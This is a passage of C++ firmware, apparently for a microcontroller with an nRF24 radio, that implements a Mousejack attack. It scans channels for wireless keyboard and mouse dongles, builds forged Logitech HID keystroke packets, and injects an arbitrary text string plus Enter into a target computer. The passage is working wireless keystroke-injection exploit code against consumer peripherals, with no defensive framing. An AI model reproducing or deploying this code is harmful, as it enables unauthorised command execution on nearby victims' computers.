            Serial.printf(NRF24_TAG " Mousejack target #%u ch=%u addr=%02X:%02X\n",
                          _mjTargetCount, _mjScanCh, buf[0], buf[1]);
        }
    }
    // Move to next channel
    _mjScanCh = (_mjScanCh + 1) % 80;
    _radio->setChannel(_mjScanCh);
}

bool Nrf24Module::_mjSendKey(uint8_t targetIdx, uint8_t mod, uint8_t key) {
    if (targetIdx >= _mjTargetCount || !_radio || !_hwConnected) return false;
    MjTarget& t = _mjTargets[targetIdx];

    _radio->stopListening();
    _radio->setChannel(t.channel);
    _radio->setAddressWidth(t.addrLen);
    _radio->openWritingPipe(t.addr);
    _radio->setDataRate(RF24_2MBPS);
    _radio->setAutoAck(false);

    // Logitech HID injection payload
    uint8_t payload[10] = {0};
    payload[0] = t.addr[0];
    payload[1] = 0x00; // device index
    payload[2] = 0xC1; // HID report type
    payload[3] = mod;
    payload[4] = 0x00;
    payload[5] = key;

    bool ok = false;
    for (int r = 0; r < 5; r++) {
        if (_radio->write(payload, 10)) { ok = true; break; }
        delayMicroseconds(500);
    }
    // Key up
    payload[3] = 0; payload[5] = 0;
    for (int r = 0; r < 3; r++) { _radio->write(payload, 10); delayMicroseconds(200); }

    _radio->startListening();
    return ok;
}

bool Nrf24Module::mousejackInject(uint8_t targetIdx, const String& text) {
    if (targetIdx >= _mjTargetCount) return false;
    Serial.printf(NRF24_TAG " Mousejack inject target=%u text='%s'\n", targetIdx, text.c_str());
    for (unsigned i = 0; i < text.length(); i++) {
        MjHidKey hk = _asciiToHid(text[i]);
        if (!_mjSendKey(targetIdx, hk.mod, hk.key)) return false;
        vTaskDelay(pdMS_TO_TICKS(10));
    }
    // Send Enter
    _mjSendKey(targetIdx, MJ_MOD_NONE, MJ_KEY_ENTER);
    return true;
}

String Nrf24Module::mousejackTargetsJson() const {
    String r = "{\"scanning\":";
    r += _mjScanning ? "true" : "false";
    r += ",\"targets\":[";
    for (uint8_t i = 0; i < _mjTargetCount; i++) {
        if (i) r += ',';
        const MjTarget& t = _mjTargets[i];
        char buf[80];
        snprintf(buf, sizeof(buf),
            "{\"idx\":%u,\"ch\":%u,\"addr\":\"%02X:%02X\",\"type\":%u,\"age\":%lu}",
            i, t.channel, t.addr[0], t.addr[1], t.devType,
            (millis() - t.lastSeen) / 1000UL);
        r += buf;
    }
    r += "]}";
    return r;
}
